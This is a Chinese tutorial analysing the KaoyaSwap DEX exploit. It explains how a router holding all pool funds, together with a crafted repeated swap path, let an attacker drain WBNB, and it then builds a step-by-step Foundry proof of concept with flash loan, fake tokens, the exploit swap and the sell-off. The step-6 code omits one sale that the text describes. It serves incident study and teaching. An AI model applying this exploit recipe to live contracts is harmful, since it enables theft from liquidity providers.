为了看的清晰，本文先分析整个事件的攻击原理和流程，然后再去写POC。

# 一. KaoyaSwap的背景知识
KaoyaSwap（烤鸭），后面简称Kaoya。是一个uniswapV2 的fork产物+项目方一点自己的微创新，而漏洞就恰恰是这个微创新带来的。

## uniswapV2的特点
先回顾下uniswapV2的swap过程：
- User：只和Router交互，token授权也是给Router
- Router：两个作用，1根据用户需求找到对应的pair；2将用户的token转给pair。
- Pair：拿到用户token，将用户需要的token直接转给用户（不经过Router）。

整个过程中，Router只是将用户的token过了一下手，平时并不持有token，好了回顾完毕。

![5dex_kaoya_1uniswapv2.png](https://img.learnblockchain.cn/attachments/2023/12/kfJljWih6569a23c257a6.png)

## Kaoya和uniswap的不同之处
既然Kaoya是fork的uniswapV2，就只需要说说它的创新点：
- uniswap：token都是每个pair池自己管理，和Router无关。
- kaoya：token全都由router管理，和Pair无关。

![5dex_kaoya_2compare_uniswap.png](https://img.learnblockchain.cn/attachments/2023/12/zn19jBDz6569a579a686d.png)


![5dex_kaoya_2compare_kaoyaswap.png](https://img.learnblockchain.cn/attachments/2023/12/pRzSOdVP656d91e684682.png)


**创新点本质就一句话：“Pair交易逻辑和资金隔离，Router作为金库保管所有资金。”**

## 长path交易

张三想用 1 个BNB交易**1800U**，path=[**WBNB**, **USDC**]。

假如，张三感觉自己钱太多了，想买个土狗币**TG**玩玩，虽然没有交易对**WBNB-TG**，但是有**USDC-TG**。张三就可以通过path=[**WBNB, USDC,TG**]一笔交易，通过 BNB 买到 TG。path 的长度大于2就是 **长path**。而Kaoya就在处理**长path**的地方出现了bug。


## Kaoya出现bug的地方：
1.`swapExactTokensForETHSupportingFeeOnTransferTokens`出现bug：转账只和lastPair
有关。bug具体有怎样的影响，攻击者又是如何利用它抢钱的，下面会一一展开。
```js
address lastPair = UniswapV2Library.pairFor(factory, path[path.length - 2], path[path.length - 1]);
        uint balanceBefore = getTokenInPair(lastPair,WETH);
        _swapSupportingFeeOnTransferTokens(path, address(this));
        uint balanceAfter = getTokenInPair(lastPair,WETH);
        uint amountOut = balanceBefore.sub(balanceAfter);
        require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');
        _transferETH(to, amountOut);
```


# 二. 攻击流程


## 概述攻击步骤
- step1：闪电贷 1800 个WBNB.
- step2：拿出 673 个WBNB 交易来 125,022 个 KY （KaoyaSwap的官方Token）；拿出 100 个WBNB 交易来 6,666 个 BUSD。
- step3：为 WBNB TA TB 这 3 个Token创建了 3 个池子并添加流动性（TA TB 是攻击者随意创建的）。
  WBNB-TA 添加流动性为 [1026e18, 50e18]；
  TB-TA 添加流动性为 [1e18, 1e18]；
  WBNB-TB 添加流动性为 [1e18, 1e18]。
- **step4：调用函数`swapExactTokensForETHSupportingFeeOnTransferTokens`，path=[TA, WBNB,TB,TA,WBNB]，amountIn= 8000e18 ，也就是用 8000 个TA来发起交易。**
- step5：移除 step3 创建的 3 个池子的流动性。
- step6：在KaoyaSwap，将 83,918 个KY交易为BUSD；在PancakeSwap将 17,740 个KY交易为BUSD；将  23,364 个KY交易为WBNB。
- step7：换闪电贷 1800 个WBNB，获利了结 272 个WBNB, 37,294 个BUSD。


上面的流程现在看不懂没关系，下面会展开的讲。很明显，问题出现在 step4。现在，我们结合数据，看看整个流程各个池子token数量上的变化。

## 详解攻击流程

### 攻击前的状态
![5dex_kaoya_4inittabledata.png](https://img.learnblockchain.cn/attachments/2023/12/K2UwUmA26569e7a0966f9.png)


### step2解析
-  673 个WBNB -> 125,022 个 KY
-  100 个WBNB -> 6,666 个 BUSD

![5dex_kaoya_5step2_data.png](https://img.learnblockchain.cn/attachments/2023/12/Qr43pGgt6569e91d25c59.png)

对比两张图能得到以下信息：
- 交易的 WBNB 都远远大于池子原有的 WBNB 数量，导致大部分的 KY 和 BUD 都到了攻击者手中。
- 由于池子 WBNB 数量剧增，导致 Kaoya 池子的价格和 Pancake 池子的价格有非常大的偏差。

### step3解析
用户在攻击前，先添加流动性

![5dex_kaoya_6step3_add.png](https://img.learnblockchain.cn/attachments/2023/12/NotuqNRM6569eac39ad07.png)

这张表就一个有用信息：第一个池子 WBNB-TA的数量 WBNB=1026,TA=50 都远远大于另外两个池。

### step4解析

#### **bug代码**

![5dex_kaoya_7step4_code.png](https://img.learnblockchain.cn/attachments/2023/12/rOa48skD6569edcff2158.png)

再次看下代码，能得到以下信息：
1. 最终转给用户的amountOut是Balance前后变化的差值。
2. balanceBefore是交易前，lastPair的WETH数量；balanceAfter是交易后，lastPair的WETH数量。
3. lastPair一定要包含 WETH。


#### **攻击哪个池子**

**需求1：swap出来大量的WETH**

既然要盈利，当然是赚越多的WETH越好：
- 如果我用同等价值的币，比如USDC交换，那么毫无意义，因为我的USDC最终留在了池子中。
- 如果能用垃圾币，换大量WETH最好，但是Kaoya里没有，而且我也没有大量的空气币。
- 最好的方案，我自己创建空气币，然后和 WETH 组对添加流动性。再用我的大量空气币 swap WETH.



#### path的精妙设计

**需求2：path需要设计好**

攻击者的 path 设计的非常巧妙，在看答案之前，我们先尝试自己设计下，方面我们理解 攻击者的构思。前面看了问题代码，我们知道`lastPair`一定要有WETH。假设有3个token， X, Y, WETH。

<br/>
<br/>

方案1. WETH 放在最后，[X, Y, WETH]
- ` X -> Y`
- ` Y -> WETH`

<br/>

这个方案有个致命问题：假如最后一笔（Y -> WETH）交易出来了100个WETH,然后Kaoya将100个WETH转给我了，这100个WETH就是我的流动性。赚的是自己的钱，白扯。由此得出结论：
**PATH设计要求1：最终WETH要留在池子中。**

<br/>
<br/>

方案2. `lastPair`有WETH，又不能放最后，就前移一位，[X,WETH,Y]
- `X -> WETH`
- `WETH -> Y`

这个方案也有问题。WETH是`lastPair`的tokenIn，也就是balanceBefore < balanceAfter，
这样`amoutOut=balanceAfter-balanceBefore`就成了负数，代码`revert`。由此得出结论：
**PATH设计要求2：WETH要在最后一位。**

<br/>
<br/>

**path的设计**

设计挺难，我放弃了。看看攻击者的设计：
[`TA, WBNB`,TB,`TA,WBNB`]

<br/>

看到华点了吧，[`TA,WBNB`]重复出现两次，分别是`firstPair`和`lastPair`。
为什么要重复出现呢？其实和前面的 2 个结论有关，具体的原因，文字解释有些费劲，让我们跟着流程和数据往下看。

<br/>
<br/>

这是3个池子的初始化状态
![5dex_kaoya_8step4_addLiu.png](https://img.learnblockchain.cn/attachments/2023/12/Qe7Y0pxz656a9bc27f055.png)

`path.length == 5`，就有 4 笔交易，我分 4 步图解：

1. TA -> WBNB，池子1

[`TA, WBNB`,TB,TA,WBNB]

![5dex_kaoya_9step4_swap1.png](https://img.learnblockchain.cn/attachments/2023/12/OstZwp7F656a9e0ad5677.png)


2. WBNB -> TB，池子2

[TA, `WBNB,TB`,TA,WBNB]


![5dex_kaoya_10step4_swap2.png](https://img.learnblockchain.cn/attachments/2023/12/HR5Inxvz656aa01b2cde0.png)


3. TB -> TA，池子3

[TA, WBNB,`TB,TA`,WBNB]


![5dex_kaoya_11step4_swap3.png](https://img.learnblockchain.cn/attachments/2023/12/oobI5hRO656aa1af5921e.png)


4. TA -> WBNB，**重回池子1**

[TA, WBNB,TB,`TA,WBNB`]


![5dex_kaoya_12step4_swap4.png](https://img.learnblockchain.cn/attachments/2023/12/ZcMiO6f2656aa880cf423.png)

看下最终的数据：


![5dex_kaoya_13step4_swapfinal.png](https://img.learnblockchain.cn/attachments/2023/12/G9mcR0ZY656aa9fab903d.png)

**重点是WBNB**，几乎1027个（有小数点的损失，为了简洁我省略了）依然留在池子中。这些是攻击者可以移除流动性，拿回手中的。

而Kaoya要根据`lastPair`的整个交易前后WBNB余额差值，给攻击者转账，这个差值，主要发生在第一笔交易=1026-6=1020 Ether（第一笔和最后一笔是同一个Pair），这个是攻击者利用Router的漏洞白赚的。

再强调下，Kaoya能给攻击者转账1020个WBNB，是因为Router管理金库，这些WBNB其实都是其他池子的；如果是Uniswap，哪怕有`lastPair`的bug，但是Router手里没钱，攻击也不会成功的。


这就是整个攻击最关键的一步。剩下的就是收尾了。

### step5解析

移除三个池子的流动性，1027个WBNB重回到攻击者手中。没什么好说的，这些钱本来的作用就是铺路的，连接攻击者和漏洞。

### step6解析

在KaoyaSwap，将 83,918 个KY交易为BUSD；在PancakeSwap将 17,740 个KY交易为BUSD；将  23,364 个KY交易为WBNB。

<br/>
<br/>

现在攻击者手里还有 step2 交易来的`125,022 个 KY` 需要善后。Kaoya被攻击，它的代币必然要大跌，不能留在手里。在BSC链，最好的出路就是换WBNB和BUSD。

<br/>

攻击者讲KY分成了3份，分钱去3个池子交易。为什么分三份，每份的数额是随便分配的吗？
这个问题先留个悬念，放在`更多的思考`去讨论。



### step7解析


换闪电贷 1800 个WBNB，获利了结 272 个WBNB, 37,294 个BUSD。这一步也没啥好说，只能说在web3，一个bug真贵。



# 三. 更多的思考

<!--StartFragment-->
整个过程分析完了，攻击原理也明了。但是呢，还有很多东西还那么透彻，
此时还有几个疑惑：
1. 为什么在攻击前要swap大量的KY Token？
2. 为什么添加流动性，只加了1020个WBNB,却要闪电贷1800个WBNB?
3. 攻击后，为什么将KY分了三笔交易出去，每笔的金额又是怎么选择的？
<!--EndFragment-->

我们不是攻击者，无法知道他心里所想。但是却可以在众多数据中找到一些蛛丝马迹。

（1）回到step4攻击后的数据

![5dex_kaoya_13step4_swapfinal.png](https://img.learnblockchain.cn/attachments/2023/12/G9mcR0ZY656aa9fab903d.png)

`balanceBefore=1026Ether,balanceAfter=6Ether`
`amountOut=balanceBefore-balanceAfter=1020 Ether`

此时此刻，Router手里至少`2040`多个WBNB：
-   第一个 `1020` WBNB，是攻击者add到池子交易后还在池子里，属于攻击者。
-   第二个 `1020` WBNB，是Router要转给攻击者的，属于被攻击者抢走的。

<br/>

先看看攻击前，Kaoya的资产状态。

![5dex_kaoya_15thinkmore_int.png](https://img.learnblockchain.cn/attachments/2023/12/GJ0TZvPU656acb548a847.png)
此时Kaoya只有 219+28=`247` WBNB。

如果要从 `247` 到 `2040`，还需要大约 `1800` 个WBNB，所以闪电贷了 `1800`。

<br/>

这个`1800`留下 `1020` 加流动性，还有大约 `780` 需要给Kaoya，怎么给？当然是交易：

于是，就有了 **step2**：拿出 `673` 个WBNB 交易来 125,022 个 KY ；拿出 `100` 个WBNB 交易来 6,666 个 BUSD。step2 之后，Kaoya 就有了 `1020` 个 WBNB。然后就是攻击者添加流动加了`1026` 个 WBNB，swap之后，Kaoya把自己的 `1020` 转给了攻击者，攻击者移除流动性又拿回了`1026` 个 WBNB，这些大家都很熟了，我就不啰嗦了 。

<br/>

还有个疑问？初始的Kaoya只有`247`个WBNB, 为什么要利用漏洞转`1020`个WBNB，为什么不是 `250` 个， 不是 `500` 个。还是回到Kaoya的初始资产
![5dex_kaoya_15thinkmore_int.png](https://img.learnblockchain.cn/attachments/2023/12/GJ0TZvPU656acb548a847.png)

<!--StartFragment-->
因为uniswap的池子，都是权重50-50的两张token：
- kaoya(KY-WBNB)：219 WBNB, KY 165040 ≈ 219 WBNB。价值≈219*2=438个 。
- kaoya(BUSD-WBNB)：28 WBNB, BUSD 8586。价值≈28*2=56个 。
- kaoya(BUSD-KY)：没有WBNB, 12w BUSD，前面0.8W BUSD  = 28 WBNB，价值 ≈ 28*15 *2 = 840。

因此， 三个池子的最大价值 = `1334` 个WBNB。

注意， 这个 1334 这个估算，非常不严格，**因为 AMM的交易有滑点，数量越大，滑点越多，有效价格和当前价格差距越大**。所以，1334 是有水分的，我猜攻击者也是因此打了折扣，但也要利润最大化，才选择了 `1020`，这比选择 `250`，`500` 都有道理。

为什么是 `1020`， 不是 `1010` ，`1050`，程序多调试几次，应该能拿到最优参数，但太细节了，就不是本文关心的了。

（2）回到step6

攻击者有 12w个KY。在KaoyaSwap，将 `83,918` 个KY交易为BUSD；在PancakeSwap将 `17,740` 个KY交易为BUSD；将  `23,364` 个KY交易为WBNB。

KY要统统换走，在 step6解析 解释过了，但是没解释为什么分了三笔，每笔的具体数字是怎么确定的，还没解释。

依然初始资产图：

![5dex_kaoya_15thinkmore_int.png](https://img.learnblockchain.cn/attachments/2023/12/GJ0TZvPU656acb548a847.png)
行1和行2的WBNB被掏空了，只剩下行3，行4，行5三个池子。

还是那个原因：**因为 AMM的交易有滑点，数量越大，滑点越多，有效价格和当前价格差距越大**。 所以1个池子滑点大了，就得拆分资金去另一个池子交易。


![5dex_kaoya_16thinkmore_last.png](https://img.learnblockchain.cn/attachments/2023/12/0VauiFO5656af528cdc81.png)

125,022 个 KY，按照三个池子的 67.12%，18.69%， 14.19%来分配。

`83,914`，`17,740`，`23,366` （按照百分比计算的）
`83,918` ，`17,740`，`23,362` （原数据）

这结果，不能说一模一样，也算是真假难辨了。


# 四. POC
<!--StartFragment-->


## 准备工作

### 最佳学习资料：[DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs)

[SunWeb3Sec: 3. 自己动手写POC1 (Price Oracle Manipulation)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc)
[SunWeb3Sec: 4. 自己动手写POC2 - MEV Bot](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04_write_your_own_poc/)
[SunWeb3Sec: 6. 自己动手写POC3 (Reentrancy)](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06_write_your_own_poc/)


工程里有大量POC代码，非常推荐！！！






### 回顾攻击步骤

* step1：闪电贷 1800 个WBNB.
* step2：拿出 673 个WBNB 交易来 125,022 个 KY （KaoyaSwap的官方Token(权杖)）；拿出 100 个WBNB 交易来 6,666 个 BUSD。
* step3：为 WBNB TA TB 这 3 个Token(权杖)创建了 3 个池子并添加流动性（TA TB 是攻击者随意创建的）。\
  WBNB-TA 添加流动性为 \[1026e18, 50e18]；\
  TB-TA 添加流动性为 \[1e18, 1e18]；\
  WBNB-TB 添加流动性为 \[1e18, 1e18]。
* **step4：调用函数`swapExactTokensForETHSupportingFeeOnTransferTokens`，path=\[TA, WBNB,TB,TA,WBNB]，amountIn= 8000e18 ，也就是用 8000 个TA来发起交易。**
* step5：移除 step3 创建的 3 个池子的流动性。
* step6：在KaoyaSwap，将 83,918 个KY交易为BUSD；在PancakeSwap将 17,740 个KY交易为BUSD；将 23,364 个KY交易为WBNB。
* step7：换闪电贷 1800 个WBNB，获利了结 272 个WBNB, 37,294 个BUSD。



### 具体准备工作1：好用的攻击交易trace链接，推荐用phaIcon，POC居家必备好伴侣。
https://explorer.phalcon.xyz/tx/bsc/0xc8db3b620656408a5004844703aa92d895eb3527da057153f0b09f0b58208d74


<!--StartFragment-->
`phaIcon` 可以看这个，非常容易入手：[第 8 期 使用 Phalcon 浏览器分析和调试交易](https://learnblockchain.cn/video/play/465)
<!--EndFragment-->


![5dex_kaoya_poc_final.png](https://img.learnblockchain.cn/attachments/2023/12/gy2wNDI2656d8d699505e.png)

我总结写POC，就一句话：“**将攻击合约的第一个子层级调用写出来即可**”。当然还有很多细节，但是小问题。


### 具体准备工作2： 找出攻击基本信息


![5dex_kaoya_poc_1.png](https://img.learnblockchain.cn/attachments/2023/12/FyETLZBG656b2ff22900c.png)

代码如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : 37,294 BUSD and 271.2 WBNB.
// Attacker : https://etherscan.io/address/0xd87FC924d4AfC6A0d086F12137CDDFeccf270307
// Attack Contract : https://etherscan.io/address/0xA722ca7Bf032dE8f7A675da75DFeC661bc89aCE9
// Vulnerable Contract : https://etherscan.io/address/0x879EAD67C92ec2bFa70fa9d157F500B7b31b64AB
// Attack Tx : https://bscscan.com/tx/0xc8db3b620656408a5004844703aa92d895eb3527da057153f0b09f0b58208d74

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x97af028838604c59f93b279d3b6f6cbbf74bc680#code

// @Analysis
// Twitter Guy :https://twitter.com/BlockSecTeam/status/1562286943957708800
// https://explorer.phalcon.xyz/tx/bsc/0xc8db3b620656408a5004844703aa92d895eb3527da057153f0b09f0b58208d74

contract ContractTest is Test {

}

```


### 具体准备工作3： 找出涉及的DEX的Router接口和Token信息。


```solidity
interface IDPP{
    function flashLoan(uint baseAmouont, uint quoteAmount, address assetTo, bytes calldata data) external;
}
interface KAOYA_ROUTER is Uni_Router_V2{
    function getTokenInPair(address pair,address token) external view returns (uint);
}
contract ContractTest is Test{
    IDPP dpp = IDPP(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));//因为它有payable的fallback
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 KY = IERC20(0xa8a33e365D5a03c94C3258A10Dd5d6dfE686941B);
    SimpleToken TA;
    SimpleToken TB;

    address KAOYA_FACTORY_ADDRESS = 0xbFB0A989e12D49A0a3874770B1C1CdDF0d9162aA;
    KAOYA_ROUTER kaoyaRouter = KAOYA_ROUTER(0x879EAD67C92ec2bFa70fa9d157F500B7b31b64AB);
    Uni_Router_V2 pancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    
    function setUp() public {
        vm.createSelectFork("bsc",20705000-1);

        vm.label(address(WBNB), 'WBNB');
        vm.label(address(BUSD), 'BUSD');
        vm.label(address(KY), 'KY');

    }
}
```
<!--StartFragment-->

## 具体写POC逻辑

### step1：闪电贷 1800 个WBNB.

<!--EndFragment-->


```solidity
    function testExploit() public {
        vm.deal(address(this),1e18);
        TA = new SimpleToken('TokenA', 'TA');
        TB = new SimpleToken('TokenB'   , 'TB');
        vm.label(address(TA), 'TA');
        vm.label(address(TB), 'TB');
        TA.mint(10000e18);
        TB.mint(100e18);
        dpp.flashLoan(1800e18, 0, address(this), new bytes(1));
        finalInterest();
    }
    function finalInterest() public {
        console.log('finalInterest');
        emit log_named_decimal_uint("mybalance WBNB" , WBNB.balanceOf(address(this)), WBNB.decimals());
        emit log_named_decimal_uint("mybalance BUSD" , BUSD.balanceOf(address(this)), BUSD.decimals());
        emit log_named_decimal_uint("mybalance KY" , KY.balanceOf(address(this)), KY.decimals());
    }
```


<!--StartFragment-->

### step2：拿出 673 个WBNB 交易来 125,022 个 KY （KaoyaSwap的官方Token(权杖)）；拿出 100 个WBNB 交易来 6,666 个 BUSD。

<!--EndFragment-->

```solidity
    function DPPFlashLoanCall(address msgSender, uint baseAmount, uint quoteAmount, bytes calldata data) public {
        //step2
        emit log_named_decimal_uint("mybalance WBNB" , WBNB.balanceOf(address(this)), WBNB.decimals());
        WBNB.approve(address(kaoyaRouter), type(uint256).max);//自己写的代码，每行都有问题，收获太大了。wbnb地址错了，写成了usdc。。。
        address[] memory  path = new address[](2);
        path[0]=address(WBNB);
        path[1]=address(KY);
        kaoyaRouter.swapExactTokensForTokens(672.8e18, 1e18, path, address(this), block.timestamp+1000);

        address[] memory  path2 = new address[](2);
        path2[0] = address(WBNB);
        path2[1] = address(BUSD);
        kaoyaRouter.swapExactTokensForTokens(100e18, 1e18, path2, address(this), block.timestamp+1000);

}
```

<!--StartFragment-->

### step3：为 WBNB TA TB 这 3 个Token(权杖)创建了 3 个池子并添加流动性（TA TB 是攻击者随意创建的）。
WBNB-TA 添加流动性为 \[1026e18, 50e18]；\
TB-TA 添加流动性为 \[1e18, 1e18]；\
WBNB-TB 添加流动性为 \[1e18, 1e18]。

<!--EndFragment-->


```solidity
function DPPFlashLoanCall(address msgSender, uint baseAmount, uint quoteAmount, bytes calldata data) public {
        //step2
        ...
        //step3
        TA.approve(address(kaoyaRouter), type(uint256).max);
        TB.approve(address(kaoyaRouter), type(uint256).max);
        (, , uint256 liquidity1) = kaoyaRouter.addLiquidity(address(WBNB), address(TA), 1026.19e18, 50e18, 380, 40, address(this), block.timestamp+1000);
        (, , uint256 liquidity2) = kaoyaRouter.addLiquidity(address(WBNB), address(TB), 1e18, 1e18, 1, 1, address(this), block.timestamp+1000);
        (, , uint256 liquidity3) = kaoyaRouter.addLiquidity(address(TA), address(TB), 1e18, 1e18, 1, 1, address(this), block.timestamp+1000);
}
```

<!--StartFragment-->

### step4：调用函数`swapExactTokensForETHSupportingFeeOnTransferTokens`，path=\[TA, WBNB,TB,TA,WBNB]，amountIn= 8000e18 ，也就是用 8000 个TA来发起交易。

<!--EndFragment-->


```solidity
function DPPFlashLoanCall(address msgSender, uint baseAmount, uint quoteAmount, bytes calldata data) public {
        //step2
        ...
        //step3
        ...
        //step4
        address[] memory path3 = new address[](5);
        path3[0] = address(TA);
        path3[1] = address(WBNB);
        path3[2] = address(TB);
        path3[3] = address(TA);
        path3[4] = address(WBNB);
        kaoyaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(8000e18, 1, path3, address(this), block.timestamp+1000);
   
}
```

<!--StartFragment-->

### step5：移除 step3 创建的 3 个池子的流动性。

<!--EndFragment-->


```solidity
function DPPFlashLoanCall(address msgSender, uint baseAmount, uint quoteAmount, bytes calldata data) public {
        //step2
        ...
        //step3
        ...
        //step4
        ...
           //step5
        removeLiquidity(address(WBNB), address(TA), liquidity1, true);
        removeLiquidity(address(WBNB), address(TB), liquidity2, true);
        removeLiquidity(address(TB), address(TA), liquidity3, false);
}
    function removeLiquidity(address token0, address token1, uint liquidity, bool containETH) public {
        (address token0, address token1) = sortTokens(token0, token1);
        Uni_Pair_V2 pair = Uni_Pair_V2(pairFor(KAOYA_FACTORY_ADDRESS, token0, token1));
        pair.approve(address(kaoyaRouter), type(uint256).max);
        console.log('liquidity', liquidity);
        //报错，transferFrom，from本合约，对了，需要LP的。之前的pair接口没有approve不对。
        if(containETH){
            kaoyaRouter.removeLiquidityETHSupportingFeeOnTransferTokens(token0, liquidity, 1, 1, address(this), block.timestamp+1000);
        }else{
            kaoyaRouter.removeLiquidity(token0, token1, liquidity, 1, 1, address(this), block.timestamp+1000);
        }
    }
        // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
//         Explicit type conversion not allowed from "uint256" to "address".
        pair = address(uint160(uint(keccak256(abi.encodePacked(
            hex'ff',
            KAOYA_FACTORY_ADDRESS,
            keccak256(abi.encodePacked(token0, token1)),
            hex'e6d6d0a3b71886f20325ef74a341f4805b42c4e8e6666b6d5d55ae47741e3e78' // init code hash
        )))));
    }
```
<!--StartFragment-->

### step6：在KaoyaSwap，将 83,918 个KY交易为BUSD；在PancakeSwap将 17,740 个KY交易为BUSD；将 23,364 个KY交易为WBNB。

<!--EndFragment-->



```solidity
function DPPFlashLoanCall(address msgSender, uint baseAmount, uint quoteAmount, bytes calldata data) public {
        //step2
        ...
        //step3
        ...
        //step4
        ...
        //step5
        ...
        
        //step 6 KY 换BUSD
        WBNB.deposit{value:address(this).balance}();
        KY.approve(address(kaoyaRouter), type(uint256).max);
        KY.approve(address(pancakeRouter), type(uint256).max);
        address[] memory  path4 = new address[](2);
        path4[0]=address(KY);
        path4[1]=address(BUSD);
        kaoyaRouter.swapExactTokensForTokens(83_918e18, 1e18, path4, address(this), block.timestamp+1000);
        pancakeRouter.swapExactTokensForTokens(17_740e18, 1e18, path4, address(this), block.timestamp+1000);
}

```
<!--StartFragment-->

### step7：换闪电贷 1800 个WBNB，获利了结 272 个WBNB, 37,294 个BUSD。

<!--EndFragment-->
```solidity
        //step 7
        WBNB.transfer(address(dpp), 1800e18);
```



<!--EndFragment-->






<!--EndFragment-->